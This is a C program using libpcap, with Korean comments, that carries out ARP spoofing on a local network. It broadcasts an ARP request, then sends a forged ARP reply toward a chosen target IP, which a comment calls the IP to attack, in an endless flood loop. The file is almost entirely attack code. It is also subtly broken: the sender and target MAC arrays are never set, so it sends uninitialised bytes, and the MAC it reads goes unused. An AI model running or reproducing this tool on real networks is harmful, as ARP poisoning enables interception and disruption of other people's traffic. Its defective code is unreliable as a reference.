#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netdb.h>
#include <arpa/inet.h>

struct ethernet_header
{
    u_int8_t dst[6];        //destination mac
    u_int8_t src[6];        //source mac
    u_int16_t type;        //ethernet type = ARP
};

struct arp_header
{
    struct ethernet_header eth;    //arp 구조체와 한번에 이어서 쓰기 위하여 ethernet 구조체를 가져옴
    u_int16_t hard_type;        //hardware type -- ethernet(1)
    u_int16_t proc_type;        //protocol type -- ARP(0x0806)
    u_int8_t hard_len;        //Hardware size -- 6
    u_int8_t proc_len;        //Protocol size -- 4
    u_int16_t oper;            //Opcode -- request(1) , reply(2)
    u_int8_t sender_mac[6];        //Sender MAC address
    u_int8_t sender_ip[4];        //Sender IP address
    u_int8_t target_mac[6];        //Target MAC address
    u_int8_t target_ip[4];        //Target IP address
};
struct reply_header
{
    struct ethernet_header eth;    //arp 구조체와 한번에 이어서 쓰기 위하여 ethernet 구조체를 가져옴
    u_int16_t hard_type;        //hardware type -- ethernet(1)
    u_int16_t proc_type;        //protocol type -- ARP(0x0806)
    u_int8_t hard_len;        //Hardware size -- 6
    u_int8_t proc_len;        //Protocol size -- 4
    u_int16_t oper;            //Opcode -- request(1) , reply(2)
    u_int8_t sender_mac[6];        //Sender MAC address
    u_int8_t sender_ip[4];        //Sender IP address
    u_int8_t target_mac[6];        //Target MAC address
    u_int8_t target_ip[4];        //Target IP address
};

void usage() {
    printf("syntax: pcap_test <interface> <sender_ip> <target_ip>\n");    //인자값이 모자라면 출력하려고 선언해둠
    printf("sample: pcap_test wlan0\n");
}
int my_dev(const char *dev, u_int8_t *mac)
{
    struct ifreq ifr;            //Ethernet 관련 정보 필요할때 사용
    int fd;
    int rv; // return value - error value from df or ioctl call

    /* determine the local MAC address */
    strcpy(ifr.ifr_name, dev);                //2번째 인자의 값을 1번째 인자로 복사 (ifr.ifr_name 은 interface name)
    fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);     //AF_INET = 네트워크 도메인 소켓(IPv4 프로토콜), Sock_Dgram = 데이터그램 소켓, IPProto_ip = IP 프로토콜 사용
    if (fd < 0)
        rv = fd;
    else
    {
        rv = ioctl(fd, SIOCGIFHWADDR, &ifr);            //SIOCGIFHWADDR 요청
        if (rv >= 0) /* worked okay */
            memcpy(mac, ifr.ifr_hwaddr.sa_data, IFHWADDRLEN);    //SIOCGIFHWADDR 를 요청하면 ifreq 구조체의 sa_data를 6바이트 읽어낸다.
    }

    return rv;
}


void char_int(char* char_ip, u_int8_t* ip){
    char* ip1=strtok(char_ip,".");            //맨처음 ./ARPSpoofing ens33 ip ip 하면서 받아온 인자 값들을 문자형에서 정수형으로 변환
    char* ip2=strtok(NULL,".");            //.을 기점으로 문자열 분리하여 char를 int형으로 변환해줌
    char* ip3=strtok(NULL,".");
    char* ip4=strtok(NULL,".");
    ip[0]=(u_int8_t)atoi(ip1);
    ip[1]=(u_int8_t)atoi(ip2);
    ip[2]=(u_int8_t)atoi(ip3);
    ip[3]=(u_int8_t)atoi(ip4);
}

int main(int argc, char* argv[]) {
    struct arp_header arp;        //구조체 불러옴
    struct reply_header rep;
    u_int8_t send_ip[4];        //sender의 ip
    u_int8_t send_mac[6];
    u_int8_t tar_ip[4];        //target의 ip
    u_int8_t tar_mac[6];        //target의 mac
    struct pcap_pkthdr* header;
    const u_char* packet;

    if (argc != 4) {
        usage();            //인자값을 4개 못받아오면 위의 usage 실행
        return -1;
    }
    char* dev = argv[1];        //1번째 인자값 --> ens33
    char_int(argv[2], send_ip);        //2번째 인자값 --> char로 받아온 send_ip를 int값으로 변환함
    char_int(argv[3], tar_ip);        //3번째 인자값 --> char로 받아온 tar_ip를 int값으로 변환함

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    while(true){
        int num;
        printf("1. MY STATUS\n");
        printf("2. ARP Spoofing\n");
        printf("3. exit\n");
        printf("  Select Number : ");
        scanf("%d",&num);

        if(num==1){
            printf("  Waiting ...\n");
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;
            printf("  Source MAC : %02X:%02X:%02X:%02X:%02X:%02X\n", packet[6],packet[7],packet[8],packet[9],packet[10],packet[11]);
            printf("  Source IP : %u.%u.%u.%u\n", packet[26],packet[27],packet[28],packet[29]);
            //나의 device에서 mac, ip 주소를 가져옴
        }

        else if(num==2){
            u_int8_t *src_mac=(u_int8_t*)malloc(sizeof(u_int8_t)*6);        //src_mac을 선언, malloc으로 크기를 동적으로 할당해줌
            my_dev(dev,src_mac);
            memcpy((char*)arp.eth.dst, "\xff\xff\xff\xff\xff\xff", 6);
                //ff:ff:ff:ff:ff:ff -> 6바이트를 arp.eth.dst에 복사
            for(int i=0; i<6; i++){
                arp.eth.src[i] = send_mac[i];
            }    //내 mac 주소를 출력 (mac은 6자리니까 for문으로 6번 돌림)
            arp.eth.type = (u_int16_t)ntohs(0x0806);
                //0806->ARP    network byte 순서를 to host byte 순서로 바꾸어준다.
                //뒤의 s는 short로 2바이트 변수에 대해 바이트 순서를 변경해준다.
            arp.hard_type = (u_int16_t)ntohs(0x0001);
                //0x0001 -> Ethernet
            arp.proc_type = (u_int16_t)ntohs(0x0800);
                //0x0800 -> IPv4
            arp.hard_len = (u_int8_t)0x06;
                //0x06 -> Hardware size
            arp.proc_len = (u_int8_t)0x04;
                //0x04 -> Protocol size
            arp.oper = (u_int16_t)ntohs(0x0001);
                //Request = 1, Reply = 2
            for(int i=0; i<6; i++){
                arp.sender_mac[i] = send_mac[i];
            }    //나의 mac 주소를 sender mac에 집어넣음
            for(int i=0; i<4; i++){
                arp.sender_ip[i] = send_ip[i];
            }    //나의 ip를 sender ip에 집어넣음
            memcpy((char*)arp.target_mac,"\x00\x00\x00\x00\x00\x00",6);
                //상대방의 MAC 주소를 모르는 상태이므로 MAC주소 지정하지 않고 모두 0으로 채워서
                //LAN 전체에 브로드캐스트, 00:00:00:00:00:00의 6바이트를 target mac 에 복사
            for(int i=0; i<4; i++){
                arp.target_ip[i] = tar_ip[i];
            }    //tar_ip를 구조체의 arp.target_ip에 저장

            printf("========================================\n");
            printf("SEND\n");
            printf("ARP REQUEST-----------------------------\n");
            printf("Ethernet Dest \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.eth.dst[0],arp.eth.dst[1],arp.eth.dst[2],arp.eth.dst[3],arp.eth.dst[4],arp.eth.dst[5]);
            printf("Ethernet Source : %02X-%02X-%02X-%02X-%02X-%02X\n", arp.eth.src[0],arp.eth.src[1],arp.eth.src[2],arp.eth.src[3],arp.eth.src[4],arp.eth.src[5]);
            printf("Ethernet Type \t: ARP (0x%04X)\n", (arp.eth.type<<8 & 0xFF00)|(arp.eth.type>>8 & 0x00FF));
            printf("---\n");
            printf("Hardware Type \t: Ethernet (%X)\n", arp.hard_type>>8);
            printf("Protocol Type \t: IPv4 (0x%04X)\n", (arp.proc_type<<8 & 0xFF00)|(arp.proc_type>>8 & 0x00FF));
            printf("Hardware Length : %X\n", arp.hard_len);
            printf("Protocol Length : %X\n", arp.proc_len);
            printf("Opcode \t\t: Request(%X)\n", arp.oper>>8);
            printf("Sender MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.sender_mac[0],arp.sender_mac[1],arp.sender_mac[2],arp.sender_mac[3],arp.sender_mac[4],arp.sender_mac[5]);
            printf("Sender IP \t: %u.%u.%u.%u\n", arp.sender_ip[0],arp.sender_ip[1],arp.sender_ip[2],arp.sender_ip[3]);
            printf("Target MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.target_mac[0],arp.target_mac[1],arp.target_mac[2],arp.target_mac[3],arp.target_mac[4],arp.target_mac[5]);
            printf("Target IP \t: %u.%u.%u.%u\n", arp.target_ip[0],arp.target_ip[1],arp.target_ip[2],arp.target_ip[3]);
            printf("========================================\n\n");
            pcap_sendpacket(handle,(u_char*)&arp, sizeof(arp));
                 //eth와 arp 구조체를 합한 길이만큼의 패킷을 보내는데 OPCode가 1이므로 Request인 패킷 보냄

            for(int i=0; i<6; i++){
                rep.eth.dst[i] = tar_mac[i];
            }    //tar_mac을 arp.eth.dst에 넣음
            for(int i=0; i<6; i++){
                rep.eth.src[i] = send_mac[i];
            }    //my_mac을 arp.eth.src에 넣음
            rep.eth.type = (u_int16_t)ntohs(0x0806);
                //ethernet type이 0x0806 = ARP이다.
            rep.hard_type = (u_int16_t)ntohs(0x0001);
                //hardware type이 0x0001 = ethernet을 사용한다. (데이터링크 계층의 프로토콜 종류를 지정하는 2바이트 필드)
            rep.proc_type = (u_int16_t)ntohs(0x0800);
                //protocol type이 0x0800 = IPv4이다. (네트워크 계층의 프로토콜이 2바이트로 지정된다.)
            rep.hard_len = (u_int8_t)0x06;
                //데이터링크 계층의 주소 크기 나타내는 필드 (MAC 주소의 크기인 6이 지정)
            rep.proc_len = (u_int8_t)0x04;
                //네트워크 계층의 프로토콜 주소 크기 (IP 주소의 크기인 4 가 지정)
            rep.oper = (u_int16_t)ntohs(0x0002);
                //Opcode = 2바이트 필드, ARP로 수행하는 작업의 종류 지정
            for(int i=0; i<6; i++){
                rep.sender_mac[i] = send_mac[i];
            }    //my_mac을 arp.sender_mac에 넣음
            for(int i=0; i<4; i++){
                rep.sender_ip[i] = send_ip[i];
            }    //보내고 싶은 ip를 arp.sender_ip에 넣음           
            memcpy((char*)rep.target_mac, tar_mac,6);
                //tar_mac 6바이트를 arp.target_mac에 저장
            for(int i=0; i<4; i++){
                rep.target_ip[i] = tar_ip[i];
            }    //공격할 ip를 arp.target_ip에 넣음

            printf("RECEIVE\n");
            printf("ARP REPLY-------------------------------\n");
            printf("Ethernet Dest \t: %02X-%02X-%02X-%02X-%02X-%02X\n", rep.eth.dst[0],rep.eth.dst[1],rep.eth.dst[2],rep.eth.dst[3],rep.eth.dst[4],rep.eth.dst[5]);
            printf("Ethernet Source : %02X-%02X-%02X-%02X-%02X-%02X\n", rep.eth.src[0],rep.eth.src[1],rep.eth.src[2],rep.eth.src[3],rep.eth.src[4],rep.eth.src[5]);
            printf("Ethernet Type \t: ARP (0x%04X)\n", (rep.eth.type<<8 & 0xFF00)|(rep.eth.type>>8 & 0x00FF));
            printf("---\n");
            printf("Hardware Type \t: Ethernet (%X)\n", rep.hard_type>>8);
            printf("Protocol Type \t: IPv4 (0x%04X)\n", (rep.proc_type<<8 & 0xFF00)|(rep.proc_type>>8 & 0x00FF));
            printf("Hardware Length : %X\n", rep.hard_len);
            printf("Protocol Length : %X\n", rep.proc_len);
            printf("Opcode \t\t: Reply (%X)\n", rep.oper>>8);
            printf("Sender MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", rep.sender_mac[0],rep.sender_mac[1],rep.sender_mac[2],rep.sender_mac[3],rep.sender_mac[4],rep.sender_mac[5]);
            printf("Sender IP \t: %u.%u.%u.%u\n", rep.sender_ip[0],rep.sender_ip[1],rep.sender_ip[2],rep.sender_ip[3]);
            printf("Target MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", rep.target_mac[0],rep.target_mac[1],rep.target_mac[2],rep.target_mac[3],rep.target_mac[4],rep.target_mac[5]);
            printf("Target IP \t: %u.%u.%u.%u\n", rep.target_ip[0],rep.target_ip[1],rep.target_ip[2],rep.target_ip[3]);
            printf("========================================\n");
            while(true){
                pcap_sendpacket(handle,(u_char*)&rep, sizeof(rep));            //무한으로 패킷 보냄
            }
        }
        else{
            exit(0);
        }
    }
    pcap_close(handle);

    return 0;

}
